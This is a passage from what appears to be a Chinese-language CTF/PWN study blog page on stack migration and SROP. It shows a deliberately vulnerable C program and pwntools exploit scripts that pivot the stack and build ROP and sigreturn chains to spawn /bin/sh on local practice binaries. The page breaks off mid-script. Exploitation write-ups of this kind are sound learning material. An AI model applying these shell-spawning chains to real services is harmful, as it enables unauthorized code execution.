@@ -1,0 +1,720 @@
+<!DOCTYPE html><html lang="[&quot;zh-CN&quot;,&quot;en&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>栈迁移stack_migration | 乙太</title><meta name="author" content="乙太"><meta name="copyright" content="乙太"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="栈迁移stack_migration 目录 SROP BROP（没有二进制程序，只有一个程序服务） ### brop 如何判断是否存在 canary 和 pie ### STEP 1 : 获取 stop_gadget ( _start 函数地址 ) ### STEP 2 :  获取 pop rdi ; ret -&gt; pop6_ret 指令 ### STEP 3 : 获取 puts_plt #">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈迁移stack_migration">
+<meta property="og:url" content="https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/index.html">
+<meta property="og:site_name" content="乙太">
+<meta property="og:description" content="栈迁移stack_migration 目录 SROP BROP（没有二进制程序，只有一个程序服务） ### brop 如何判断是否存在 canary 和 pie ### STEP 1 : 获取 stop_gadget ( _start 函数地址 ) ### STEP 2 :  获取 pop rdi ; ret -&gt; pop6_ret 指令 ### STEP 3 : 获取 puts_plt #">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps331.jpg">
+<meta property="article:published_time" content="2026-05-27T16:25:48.000Z">
+<meta property="article:modified_time" content="2026-05-27T17:42:50.236Z">
+<meta property="article:author" content="乙太">
+<meta property="article:tag" content="在IDA里找到">
+<meta property="article:tag" content="ROPgadget">
+<meta property="article:tag" content="用pwntools自带的工具构建系统调用结构rt_sigreturn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps331.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "栈迁移stack_migration",
+  "url": "https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/",
+  "image": "https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps331.jpg",
+  "datePublished": "2026-05-27T16:25:48.000Z",
+  "dateModified": "2026-05-27T17:42:50.236Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "乙太",
+      "url": "https://blog.oisec.cn"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/toux.jpg"><link rel="canonical" href="https://blog.oisec.cn/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":2,"unescape":true,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'medium_zoom',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '栈迁移stack_migration',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/github-chart.css"><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="乙太" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">256</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">70</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps331.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/toux.jpg" alt="Logo"><span class="site-name">乙太</span></a><a class="nav-page-title" href="/"><span class="site-name">栈迁移stack_migration</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/atom.xml"><i class="fa-fw fas fa-rss"></i><span> RSS</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">栈迁移stack_migration</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-27T16:25:48.000Z" title="发表于 2026-05-28 00:25:48">2026-05-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-27T17:42:50.236Z" title="更新于 2026-05-28 01:42:50">2026-05-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%80%86%E5%90%91/">逆向</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%80%86%E5%90%91/PWN/">PWN</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><strong>栈迁移stack_migration</strong></p>
+<p>目录</p>
+<p><a href="#_Toc16949">SROP</a></p>
+<p><a href="#_Toc18200">BROP（没有二进制程序，只有一个程序服务）</a></p>
+<p><a href="#_Toc6058">### brop 如何判断是否存在 canary 和 pie</a></p>
+<p><a href="#_Toc22066">### STEP 1 : 获取 stop_gadget ( _start 函数地址 )</a></p>
+<p><a href="#_Toc24587">### STEP 2 :  获取 pop rdi ; ret -&gt; pop6_ret 指令</a></p>
+<p><a href="#_Toc12192">### STEP 3 : 获取 puts_plt</a></p>
+<p><a href="#_Toc311">### STEP 4 : dump 程序</a></p>
+<p><a href="#_Toc29793">### STEP 5 ：获取 puts_got</a></p>
+<p><a href="#_Toc10309">### STEP 6 : 获取 libc 版本</a></p>
+<p><a href="#_Toc21733">### STEP 7：打 ret2libc</a></p>
+<p>原始的rbp类似一个链表的结构</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps331.jpg" alt="wps331"> </p>
+<p>rsp 被迁移到另外的地方</p>
+<p>例题：# stack_migration</p>
+<p> </p>
+<p>因此，在这道题目中，我们可以现在 name 上布置 rop 链，同时利用栈溢出修改 rbp 和 ret_addr 。修改 rbp 为 name 地址，修改 ret_addr 为 leave ; ret 指令</p>
+<p> </p>
+<p>IDA中分析：</p>
+<p>由于只能写0x18个字节，所以只能覆盖到rbp和ret_addr</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps332.jpg" alt="wps332"> </p>
+<p> </p>
+<p>注意在 system 函数执行时候，会大量消耗栈资源（形象的来说就是调用system函数申请堆栈空间的时候需要让rsp上升很多，也就是申请很多的堆栈空间），所以我们要控制好迁移后的栈地址，让 system 函数能过正常地执行。</p>
+<p> </p>
+<p>编写payload:</p>
+<p>方法一：</p>
+<p> </p>
+<p>p64(ret)*0x101是因为system占用大量资源，这样可以为缓冲区申请大量的资源，而且还要平衡堆栈。还有这个数据如果太小就会发生RSP是白色的错误，这就是没有可写权限会发生</p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps333.jpg" alt="wps333"> </p>
+<p>而且RSP特别的小，这就是应为RSP往上移了很多，RSP上移动减小。所以我们可以填充很多个的ret来申请足够多的栈空间</p>
+<p> </p>
+<p>像这样就是栈对其错误，所以再加1个ret,让栈对其就可以了</p>
+<p> </p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps334.jpg" alt="wps334"> </p>
+<p> </p>
+<p>payload也可以这么写：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(ret)*<span class="number">0x101</span> + p64(rdi) + p64(binsh) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(name) + p64(leave)</span><br></pre></td></tr></table></figure>
+
+<p>方法二：</p>
+<p>p64(name + 0xa00 - 8)是因为栈迁移方法的第一个栈地址里面的数据会被pop给ebp所以没有什么用，所以应该-8就是留着“&#x2F;bin&#x2F;sh\x00”等下弹给ebp（本来我还想能否直接ljust补充“&#x2F;bin&#x2F;sh\x00”的,但是搜了才知道ljust只能填一个字节一次，所以不行），让它pop的是&#x2F;x00，这样后面才会就会正常的执行pop rdi ; ret。应为这条指令存在的位置是name+0xa00</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./Stack_migration&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./Stack_migration&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ELF = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x401230&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x401323</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x4040A0</span> <span class="comment">#在IDA里找到</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary ./Stack_migration | grep leave ; ret</span></span><br><span class="line"></span><br><span class="line">leave = <span class="number">0x401275</span></span><br><span class="line"></span><br><span class="line">binsh = name</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># payload1 = b&#x27;/bin/sh\x00&#x27; + p64(ret)*0x101 + p64(rdi) + p64(binsh) + p64(elf.sym[&#x27;system&#x27;])</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0xa00</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(rdi) + p64(binsh) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name?\n&#x27;</span>, payload1)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># payload2 = b&#x27;a&#x27;*0x8 + p64(name) + p64(leave)</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(name + <span class="number">0xa00</span> - <span class="number">8</span>) + p64(leave)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, payload2)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>SROP</strong></p>
+<p>题目;</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="type">char</span> s[<span class="number">0x10</span>] = <span class="string">&quot;&gt;&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">game</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hello, hacker!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;sub rsp, 0x10;&quot;</span> <span class="comment">// 栈空间只开辟了 rbp + 0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span> <span class="comment">//read</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;mov edx, 0x1000;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;lea rsi, [rsp + 8];&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;xor rdi, rdi;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;syscall;&quot;</span> <span class="comment">// read(0, rsp + 8, 0x1000); 栈溢出漏洞</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;mov edi, 1;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;lea rsi, [rsp + 8];&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;mov edx, 0x30;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;push 1;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;pop rax;&quot;</span> <span class="comment">// rax = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;syscall;&quot;</span> <span class="comment">// write(1, rsp + 8, 0x30); 存在一个内存信息泄露漏洞</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;add rsp, 0x10;&quot;</span></span><br><span class="line"></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    game();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F; gcc srop.c -o srop -fno-stack-protector -no-pie -masm&#x3D;intel</p>
+<p>srop 实质是一个系统调用，这个系统调用是从栈上取值，恢复寄存器状态的一个系统调用，其系统调用号为 0xf ，rt_sigreturn</p>
+<p>原理图：</p>
+<p> </p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps335.jpg" alt="wps335"> </p>
+<p>如果是这样，那么我们是不是能够控制 rax &#x3D; 0x3b ，rdi -&gt; binsh ，rsi -&gt; rdx -&gt; 0 ，rip -&gt; syscall ，就可以执行 execev(‘&#x2F;bin&#x2F;sh’, 0, 0) 系统调用了。</p>
+<p>为了达到这样的攻击目标，我们首先要先能控制 rax &#x3D; 0xf ，并且能够执行 syscall 指令，这样才能调用 rt_sigreturn</p>
+<p> </p>
+<p><img src="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps336.jpg" alt="wps336"> </p>
+<p>题目里面，可以发现 pop rax; syscall ; 这样的指令，就可以控制 rax ，并且执行 syscall 指令了。</p>
+<p>接下来，就是 binsh ，那么要如何找到呢 ？</p>
+<p> </p>
+<p>一般libc地址是0x7f，栈地址是0x7ff。</p>
+<p>通过第二个 write 泄露内存信息漏洞，我们可以泄露出栈地址，而栈空间是我们能够写入数据的，那么我们便可以写入 &#x2F;bin&#x2F;sh ,最后通过 调试 + 计算得出 &#x2F;bin&#x2F;sh 的地址</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">debug(<span class="string">&#x27;b *0x4011ee&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;hacker!\n&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span> + p64(elf.sym[<span class="string">&#x27;vuln&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">stack = l64()</span><br><span class="line"></span><br><span class="line">binsh = stack - <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;stack&#x27;</span>, stack)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但我们能够得到 &#x2F;bin&#x2F;sh 地址之后，就是我们的 srop 漏洞利用了</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./srop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *0x4011ee&#x27;)</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#ROPgadget --binary srop | grep syscall</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x4011ED</span></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x4011DA</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输入/bin/sh，并泄露0x30最后的堆栈地址，再执行vuln</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="number">2</span>*<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(elf.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;hacker!\n&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.success(<span class="string">&quot;stack -- &gt;&gt; 0x%X&quot;</span> % stack)</span><br><span class="line"></span><br><span class="line">binsh = stack - <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#用pwntools自带的工具构建系统调用结构rt_sigreturn</span></span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line"></span><br><span class="line">sigframe.rax = constants.SYS_execve<span class="comment">#0x3b</span></span><br><span class="line"></span><br><span class="line">sigframe.rdi = binsh</span><br><span class="line"></span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">sigframe.rip = syscall</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)<span class="comment">#为了防止同时和上面的一起发paylaod</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0x10</span>*<span class="string">b&#x27;a&#x27;</span> + p64(pop_rax) + p64(<span class="number">0xf</span>) + flat(sigframe)</span><br><span class="line"></span><br><span 